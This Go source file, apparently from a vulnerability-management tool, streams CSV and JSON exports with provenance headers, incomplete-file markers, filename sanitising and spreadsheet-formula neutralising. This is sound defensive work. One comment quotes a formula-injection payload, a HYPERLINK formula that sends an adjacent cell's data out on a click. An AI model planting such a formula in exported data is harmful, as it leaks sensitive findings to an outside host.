// Copyright Nexthop Systems Inc.
// SPDX-License-Identifier: Apache-2.0

package core

import (
	"context"
	"encoding/csv"
	"encoding/json"
	"errors"
	"fmt"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/danielgtaylor/huma/v2"
	"github.com/uptrace/bun"

	"github.com/nexthop-ai/openpsirt/internal/database"
	"github.com/nexthop-ai/openpsirt/internal/finding"
)

// Exporting writes a list out as it is read.
//
// The subject travels through the stream. An export is the easiest place in
// this codebase to build a list first and narrow it afterwards, which is
// exactly the failure the narrowing helper's own comment warns about — so this
// is the same query with the same subject, paged and written as it goes, and
// there is no point at which a whole unnarrowed list exists.
//
// Paged rather than unbounded. A year of a real deployment is more rows
// than a process should hold, and the page is the same page the screen reads:
// one query shape, so a spreadsheet and a screen cannot disagree about what
// the filter means.
type Exporting struct {
	// The name of the file, in the words the report it comes from is known
	// by. Stated on every export, with the moment it was taken, by
	// writeExport rather than by each caller: an export that cannot say
	// what it is and when is not evidence, and a fact every file must
	// carry is one no file can be written without.
	What string
	// About is what else the file says about itself above the rows, each a
	// label and a value, stated because a spreadsheet opened six months
	// later has nowhere else to carry it.
	//
	// Whatever narrowed it. The deployment's severity line is the case
	// this exists for — a file that omits a third of the estate lies by
	// omission — and which two builds a comparison compares, which window a
	// report covers and the threshold a true/false column was computed
	// against are the same shape of fact.
	//
	// A fact with nothing to say is left out rather than stated empty: a key
	// reading "triaged at or above" with nothing after it, on a file about
	// scans, is worse than silence.
	About  []Stated
	Header []string
	// Rows reads a page at a time, for a list assembled by grouping: the page
	// is the unit its statement answers in.
	//
	// Every page is read through the handle it is handed, which is one
	// snapshot of the database for the whole file. Each page is its own
	// statement, and a row written between two of them would otherwise move
	// every later row by one, so the file repeats a row or skips one and
	// says it is complete. A read through any other handle sees a moving
	// database again.
	//
	// Exactly one of Rows, Stream and Held is set.
	Rows Paged
	// Stream hands over every row as it arrives, for a reader that can open a
	// cursor over the whole answer.
	//
	// Paging is what a large export cannot afford. Each page re-runs the
	// statement, which re-sorts everything and then skips past what has
	// already been written, so the deeper the file gets the more each page
	// costs: a build's disposition register takes 52 minutes and the last page
	// costs five times the first. Streamed, the same file is 1.9 seconds.
	//
	// It gives up nothing paging avoids. "No complete list ever exists in
	// memory" is what a cursor gives — this holds one row — and paging adds
	// the re-sorting on top of that.
	Stream func(ctx context.Context, each func([]string) error) error
	// Held is a list read whole before the response begins: a comparison, a
	// series of days or steps, or a list the screen already reads whole. It
	// holds no connection while it is written.
	Held [][]string
}

// Paged reads one page of a file's rows through db.
type Paged func(ctx context.Context, db bun.IDB, limit, offset int) ([][]string, error)

// InTurn is the rows of several lists one after another, for a file holding
// more than one: every row of the first, then every row of the next.
//
// A list is done when it answers an empty page, and the next is read from its
// own first row. The offset a page is asked at is the number of rows written
// before it, which is how every export is paged.
func InTurn(parts ...Paged) Paged {
	at, from := 0, 0
	return func(ctx context.Context, db bun.IDB, limit, offset int) ([][]string, error) {
		for at < len(parts) {
			rows, err := parts[at](ctx, db, limit, offset-from)
			if err != nil || len(rows) > 0 {
				return rows, err
			}
			at, from = at+1, offset
		}
		return nil, nil
	}
}

// Stated is one fact a file says about itself.
type Stated struct {
	Label string
	Value string
}

// triagedAtOrAbove is the label a findings file states its minimum severity
// under.
const triagedAtOrAbove = "triaged at or above"

// TriagedAtOrAbove is the minimum severity a file of findings was read at, as
// the file states it: the severity, or everything where none hides anything.
func TriagedAtOrAbove(floor finding.MinimumSeverity) Stated {
	line := "everything"
	if floor.Hides() {
		line = floor.Word
	}
	return Stated{Label: triagedAtOrAbove, Value: line}
}

// TriagedEachAtItsOwn is the statement of a file spanning products, each
// read at its own minimum severity.
func TriagedEachAtItsOwn() Stated {
	return Stated{Label: triagedAtOrAbove, Value: "each product's own minimum severity"}
}

// preamble is everything the file says about itself: what it is and when it
// was taken, whatever narrowed it, and the request that produced it.
//
// The first two are written here rather than asked of every caller. An export
// that cannot say what it is and when it was taken is not evidence, and nine
// files each stating it their own way is nine chances for one of them not to.
func preamble(out Exporting, now time.Time, asked string) []Stated {
	said := make([]Stated, 0, len(out.About)+3)
	if out.What != "" {
		said = append(said, Stated{"export", out.What})
	}
	said = append(said, Stated{"taken on", Stamp(now)})
	for _, one := range out.About {
		if one.Value == "" {
			continue
		}
		said = append(said, one)
	}
	// The request's own query, which is what narrowed this file.
	//
	// Taken from the request rather than described from the filter. A
	// description assembled field by field is a list somebody has to keep in
	// step with the filters, and the one it misses is the one that makes the
	// file read as complete about rows it left out. The request is also what
	// reproduces the file.
	if asked != "" {
		said = append(said, Stated{"narrowed by", asked})
	}
	return said
}

// exportPage is how much is read at a time. The list's own maximum, so the
// export and the screen ask the same question.
const exportPage = 200

// exportStall is how long an export may go without writing anything before
// the connection is closed under it.
//
// The server bounds a response by how long the whole of it takes, which is
// right for a request that answers and wrong for one that streams: a real
// build's disposition register is a quarter of a million occurrences, and it
// arrives cut off in the middle of a row at exactly five minutes, with no
// marker, because the connection is closed under the handler rather than a
// write failing. A file that simply stops is a file somebody reads as
// complete — the very thing the comment on the error path above says.
//
// So the deadline moves with the writing instead of with the request. A
// client that has stopped reading still reaches it; an export that is making
// progress is no longer punished for being large.
const exportStall = 2 * time.Minute

// exportCeiling is the longest an export reads the database for: a stream's
// cursor, or a paged file's snapshot.
//
// A reader that takes a page every two minutes keeps exportStall from ever
// firing, and the cursor, with its connection, is held for as long as the file
// takes at that pace: about 41 hours for a build of 249,288 occurrences. On SQLite
// that connection is the whole pool, so every other request waits behind it.
// The measured file takes 1.9 seconds to read from the database, so the
// ceiling leaves an honest download on a slow link room to finish. A file cut
// at the ceiling carries the incomplete marker.
const exportCeiling = 10 * time.Minute

// writing extends the response's deadline for as long as an export keeps
// producing.
//
// Returns a no-op where the writer underneath cannot take a deadline, which is
// the shape of a test harness: an export that cannot move the deadline behaves
// as it does without this.
//
// Asked of the body writer rather than through the adapter's own unwrap, which
// panics on a context it did not make — and through the unwrap nothing but the
// server itself can drive an export.
func writing(ctx huma.Context) func() {
	w, ok := ctx.BodyWriter().(http.ResponseWriter)
	if !ok {
		return func() {}
	}
	control := http.NewResponseController(w)
	if control.SetWriteDeadline(time.Now().Add(exportStall)) != nil {
		return func() {}
	}
	return func() { _ = control.SetWriteDeadline(time.Now().Add(exportStall)) }
}

// DownloadName is a product's name made safe to put in a header.
//
// Two of these names come from the catalog, where a name is checked for being
// usable as an identifier and not for being usable in a quoted header field: a
// quote ends the field early and a carriage return ends the header. Done here
// rather than only at the catalog because this is the place that must be
// right — every export goes through it, including any added later, and a name
// declared before the catalog was tightened is still in the database.
//
// Anything outside letters, digits, dot, underscore and dash becomes a dash,
// because this names a file somebody saves and finds again.
func DownloadName(name string) string {
	kept := make([]rune, 0, len(name))
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
			kept = append(kept, r)
		case r == '.' || r == '_' || r == '-':
			kept = append(kept, r)
		default:
			kept = append(kept, '-')
		}
	}
	trimmed := strings.Trim(strings.TrimLeft(string(kept), "."), "-")
	if trimmed == "" {
		// A name made entirely of characters this drops. The file still has to
		// be called something, and something generic is better than a header
		// that is empty where a filename should be.
		return "export"
	}
	return trimmed
}

// Export answers with a list as a CSV or JSON file.
//
// An export reading the database as it writes holds a connection for as long
// as the file takes: a cursor for the whole of a stream, and one snapshot
// across every page of a paged file. Three bounds hold it. The write deadline
// moves with the writing: a reader that has stopped reading loses the
// connection after exportStall. The read is cut at exportCeiling however
// steadily the file is being read, so a reader draining just fast enough to
// keep the deadline moving gives the connection back all the same. And only
// so many such exports run at once, which streamSlots decides from the size of
// the pool; one more is refused with a time to ask again, before the first
// byte. A list read whole beforehand holds no connection and takes no slot.
func Export(in Deps, format, name string, out Exporting) (*huma.StreamResponse, error) {
	release := func() {}
	if out.Rows != nil || out.Stream != nil {
		var err error
		if release, err = streamSlotsFor(in.DB).take(); err != nil {
			return nil, err
		}
	}
	return &huma.StreamResponse{Body: func(ctx huma.Context) {
		defer release()
		writeExport(ctx, in, format, name, out)
	}}, nil
}

// writeExport streams a list as CSV or JSON.
//
// The two formats differ in five places — the content type, the extension,
// what goes before the rows, how a row is written, and what is said where the
// file stops early — and in nothing else. Written as two functions they are
// the same page loop twice, so the incomplete marker has two homes and the
// stall deadline two ways of being renewed.
func writeExport(ctx huma.Context, in Deps, format, name string, out Exporting) {
	kind := asCSV
	if format == "json" {
		kind = asJSON
	}
	ctx.SetHeader("Content-Type", kind.contentType)
	ctx.SetHeader("Content-Disposition",
		`attachment; filename="`+DownloadName(name)+"."+kind.extension+`"`)
	going := writing(ctx)
	write := kind.open(ctx, out)
	if err := eachPage(ctx.Context(), in.DB, out, func(rows [][]string) {
		for _, row := range rows {
			write.row(row)
		}
	}, func() {
		write.flush()
		going()
	}); err != nil {
		// The status is long gone by the time this can fail. Saying so in the
		// file is the only honest thing left: a file that simply stops is a
		// file somebody reads as complete. Logged as well, because a 200 has
		// already gone out and nothing else tells an operator. A reader that
		// went away is a warning, the rest a fault.
		level := slog.LevelError
		if errors.Is(err, context.Canceled) {
			level = slog.LevelWarn
		}
		Of(ctx.Context(), in).Log().Log(ctx.Context(), level, "an export stopped early",
			"export", out.What, "error", err)
		write.cutShort()
		return
	}
	write.done()
}

// An export format: what it calls itself, and how it writes rows.
type exportFormat struct {
	contentType string
	extension   string
	// open writes whatever goes above the rows and answers with the sink.
	// Called after the headers, because the body writer is what commits them.
	open func(huma.Context, Exporting) sink
}

// A sink is one format's four acts. Kept as closures over the writer rather
// than as an interface with four implementations of nothing: what varies is
// this much and no more.
type sink struct {
	row      func(row []string)
	flush    func()
	cutShort func()
	done     func()
}

var asCSV = exportFormat{
	contentType: "text/csv; charset=utf-8",
	extension:   "csv",
	open: func(ctx huma.Context, out Exporting) sink {
		w := csv.NewWriter(ctx.BodyWriter())
		width := len(out.Header)
		// The file's own header, above the column names, because a
		// spreadsheet has nowhere else to carry it.
		//
		// Padded to the header's width, like every other record that is not a
		// row. CSV has no comment convention — the `#` is a data character —
		// so a two-field record above a fifteen-field header is a document a
		// conformant reader refuses, and the field-count check the tests here
		// run is what catches it.
		for _, said := range preamble(out, time.Now(), ctx.URL().RawQuery) {
			_ = w.Write(padded(inert([]string{"# " + said.Label, said.Value}), width))
		}
		_ = w.Write(out.Header)
		return sink{
			row:   func(row []string) { _ = w.Write(inert(row)) },
			flush: w.Flush,
			cutShort: func() {
				_ = w.Write(padded(
					[]string{"# this export stopped early and is incomplete"}, width))
				w.Flush()
			},
			done: w.Flush,
		}
	},
}

var asJSON = exportFormat{
	contentType: "application/json; charset=utf-8",
	extension:   "json",
	open: func(ctx huma.Context, out Exporting) sink {
		body := ctx.BodyWriter()
		// Written by hand rather than marshalled whole, for the reason the
		// CSV is streamed: the point is that no complete list ever exists in
		// memory.
		_, _ = fmt.Fprint(body, "{")
		for _, said := range preamble(out, time.Now(), ctx.URL().RawQuery) {
			_, _ = fmt.Fprintf(body, "%s:%s,", quoted(asKey(said.Label)), quoted(said.Value))
		}
		_, _ = fmt.Fprint(body, `"items":[`)
		first := true
		return sink{
			row: func(row []string) {
				if !first {
					_, _ = fmt.Fprint(body, ",")
				}
				first = false
				_, _ = fmt.Fprint(body, "{")
				for i, column := range out.Header {
					if i > 0 {
						_, _ = fmt.Fprint(body, ",")
					}
					value := ""
					if i < len(row) {
						value = row[i]
					}
					_, _ = fmt.Fprintf(body, "%s:%s", quoted(asKey(column)), quoted(value))
				}
				_, _ = fmt.Fprint(body, "}")
			},
			flush:    func() {},
			cutShort: func() { _, _ = fmt.Fprint(body, `],"incomplete":true}`) },
			done:     func() { _, _ = fmt.Fprint(body, `]}`) },
		}
	},
}

// eachPage walks an export's rows, a page at a time, until there are none.
//
// Stepping by what came back, and stopping when nothing does. Stepping by the
// page size and stopping on a short page reads exportPage as the truth about a
// store's own page, and it is a guess: a reader whose ceiling is lower returns
// a short page every time, so the export ends after one of them, having
// written a fraction of the file and said nothing — which is the silent
// truncation these files exist not to do. This costs one query at the end and
// stops that being something anybody has to keep true.
//
// Every page of a paged file is read inside one snapshot, cut at the same
// ceiling as a stream's cursor.
func eachPage(ctx context.Context, db *database.DB, out Exporting,
	page func(rows [][]string), between func()) error {

	switch {
	case out.Stream != nil:
		return streamed(ctx, out, page, between, exportCeiling)
	case out.Rows == nil:
		for at := 0; at < len(out.Held); at += exportPage {
			page(out.Held[at:min(at+exportPage, len(out.Held))])
			between()
		}
		return nil
	}
	ctx, cancel := context.WithTimeout(ctx, exportCeiling)
	defer cancel()
	return database.Snapshot(ctx, db, func(ctx context.Context, view bun.IDB) error {
		for offset := 0; ; {
			rows, err := out.Rows(ctx, view, exportPage, offset)
			if err != nil {
				return err
			}
			if len(rows) == 0 {
				return nil
			}
			page(rows)
			offset += len(rows)
			between()
		}
	})
}

// streamed walks a streamed export, closing its cursor at the ceiling.
//
// Written one at a time, and flushed every so often rather than every row: a
// flush is a write to the socket, and a quarter of a million of them costs
// more than the query did.
//
// The ceiling is a deadline on the context the cursor was opened with, so the
// driver closes the cursor and returns its connection when it passes, even
// while a write to a slow reader is still blocked.
func streamed(ctx context.Context, out Exporting,
	page func(rows [][]string), between func(), ceiling time.Duration) error {

	ctx, cancel := context.WithTimeout(ctx, ceiling)
	defer cancel()
	written := 0
	err := out.Stream(ctx, func(row []string) error {
		if err := ctx.Err(); err != nil {
			return err
		}
		page([][]string{row})
		written++
		if written%exportPage == 0 {
			between()
		}
		return nil
	})
	if err == nil {
		// A cursor closed by the ceiling can end as though it ran out of rows.
		err = ctx.Err()
	}
	return err
}

// inert stops a spreadsheet reading a value as a formula.
//
// Component names, versions and descriptions arrive in somebody else's SBOM,
// and the people who open these files hold the most access in the deployment.
// A cell beginning `=`, `+`, `-` or `@` is a formula to Excel and to
// LibreOffice, so a package named `=HYPERLINK("http://…"&A1,"detail")` reads
// the row beside it — a row of this deployment's open critical findings — and
// sends it somewhere on a click. A leading tab or carriage return does the
// same by being trimmed before the parse.
//
// A leading apostrophe is what stops it, and it is not stored: nothing here
// changes what the value is, only how a spreadsheet reads the file. Quoting
// does not help, because the escape is about CSV grammar and this is about
// what the cell means once the grammar has been read.
func inert(row []string) []string {
	out := make([]string, len(row))
	for i, cell := range row {
		if cell == "" {
			out[i] = cell
			continue
		}
		switch cell[0] {
		case '=', '+', '-', '@', '\t', '\r':
			out[i] = "'" + cell
		default:
			out[i] = cell
		}
	}
	return out
}

// padded fills a record out to the width the header states.
//
// A record narrower than the header is a document a conformant CSV reader
// refuses, because the format has no comment convention and no notion of a
// short row — the `#` that opens the two records this applies to is a data
// character like any other.
func padded(cells []string, width int) []string {
	for len(cells) < width {
		cells = append(cells, "")
	}
	return cells
}

// asKey is the JSON name of a stated fact: the words it is written in on
// paper, joined the way every other field here is named.
//
// Applied to the column names too. Written without it, one document carries
// two conventions: the stated fact's key has underscores and every column name
// keeps the spaces it is read with on paper.
func asKey(label string) string {
	return strings.ReplaceAll(label, " ", "_")
}

// quoted is a JSON string, escaped by the standard library rather than by
// hand: a component name and a description both come from a third party.
func quoted(value string) string {
	out, err := json.Marshal(value)
	if err != nil {
		return `""`
	}
	return string(out)
}
